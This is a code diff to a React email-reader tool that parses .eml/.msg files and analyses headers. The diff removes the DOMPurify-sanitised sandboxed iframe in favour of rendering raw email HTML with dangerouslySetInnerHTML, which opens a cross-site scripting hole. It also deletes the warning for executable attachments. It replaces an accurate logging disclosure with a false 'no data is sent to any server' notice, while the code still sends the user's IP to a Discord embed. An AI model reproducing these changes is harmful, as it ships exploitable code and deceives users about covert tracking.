@@ -1,9 +1,8 @@
 import React, { useState, useEffect, useCallback } from 'react';
 import { Upload, AlertCircle, CheckCircle, XCircle, Mail, FileText, Shield } from 'lucide-react';
 import PostalMime from 'postal-mime';
-
+import MSGReader from '@kenjiuno/msgreader';
 import { Buffer } from 'buffer';
-import DOMPurify from 'dompurify';
 
 // Make Buffer available globally for MSGReader
 window.Buffer = Buffer;
@@ -28,16 +27,10 @@ const EmailReader = () => {
     }
 
     try {
-      // Get user's IP address from Cloudflare's own edge trace (no third-party dependency)
-      let userIP = 'Unknown';
-      try {
-        const traceResponse = await fetch('https://cloudflare.com/cdn-cgi/trace');
-        const traceText = await traceResponse.text();
-        const ipMatch = traceText.match(/^ip=(.+)$/m);
-        if (ipMatch) userIP = ipMatch[1].trim();
-      } catch {
-        // IP lookup failed silently — telemetry continues without it
-      }
+      // Get user's IP address
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const userIP = ipData.ip;
 
       // Build Discord embed
       const embed = {
@@ -136,7 +129,7 @@ const EmailReader = () => {
       analyzeHeaders();
       setAutoAnalyze(false);
     }
-  }, [autoAnalyze, headerInput, analyzeHeaders]);
+  }, [autoAnalyze]);
 
   // Parse headers into array format (key insight from working code!)
   const parseHeadersToObject = useCallback((headerText) => {
@@ -484,7 +477,6 @@ const EmailReader = () => {
   const processMSGFile = async (file) => {
     try {
       const arrayBuffer = await file.arrayBuffer();
-      const { default: MSGReader } = await import('@kenjiuno/msgreader');
       const msgReader = new MSGReader(arrayBuffer);
       const fileData = msgReader.getFileData();
       
@@ -596,30 +588,9 @@ const EmailReader = () => {
     );
   };
 
-  // Extensions considered dangerous/executable
-  const DANGEROUS_EXTENSIONS = [
-    'exe', 'bat', 'cmd', 'com', 'msi', 'ps1', 'psm1', 'psd1',
-    'vbs', 'vbe', 'js', 'jse', 'wsf', 'wsh', 'hta', 'scr',
-    'pif', 'reg', 'lnk', 'jar', 'sh', 'bash', 'zsh', 'py',
-    'rb', 'pl', 'php', 'asp', 'aspx', 'cpl', 'inf', 'sys',
-    'dll', 'ocx', 'iso', 'img', 'dmg', 'apk', 'ipa'
-  ];
-
   // Download attachment function
   const downloadAttachment = (attachment) => {
     try {
-      // Check for dangerous file extension
-      const filename = attachment.filename || '';
-      const ext = filename.split('.').pop()?.toLowerCase() || '';
-      if (DANGEROUS_EXTENSIONS.includes(ext)) {
-        const confirmed = window.confirm(
-          `⚠️ Warning: "${filename}" has a potentially dangerous file type (.${ext}).\n\n` +
-          `This type of file can execute code on your computer and may be malicious.\n\n` +
-          `Only proceed if you trust the source of this email.\n\nDownload anyway?`
-        );
-        if (!confirmed) return;
-      }
-
       let blob;
       
       // Handle different attachment formats
@@ -825,13 +796,7 @@ const EmailReader = () => {
                       <h4 className="font-bold text-gray-800 mb-3">Email Content</h4>
                       <div className="bg-gray-50 p-4 rounded-lg max-h-96 overflow-y-auto">
                         {emailData.html ? (
-                          <iframe
-                            sandbox=""
-                            srcDoc={DOMPurify.sanitize(emailData.html, { USE_PROFILES: { html: true } })}
-                            title="Email content"
-                            className="w-full border-0 rounded"
-                            style={{ minHeight: '300px', height: '400px' }}
-                          />
+                          <div dangerouslySetInnerHTML={{ __html: emailData.html }} />
                         ) : (
                           <pre className="whitespace-pre-wrap text-sm">{emailData.text}</pre>
                         )}
@@ -887,9 +852,8 @@ const EmailReader = () => {
           </div>
         </div>
 
-        <div className="text-center text-sm text-gray-600 space-y-1">
-          <p>Email files are processed locally in your browser — file contents and attachments are never uploaded to any server.</p>
-          <p className="text-gray-400 text-xs">Analysis metadata (IP address, From/To addresses, and authentication results) is logged for usage monitoring.</p>
+        <div className="text-center text-sm text-gray-600">
+          <p>This tool processes files locally in your browser. No data is sent to any server.</p>
         </div>
       </div>
     </div>
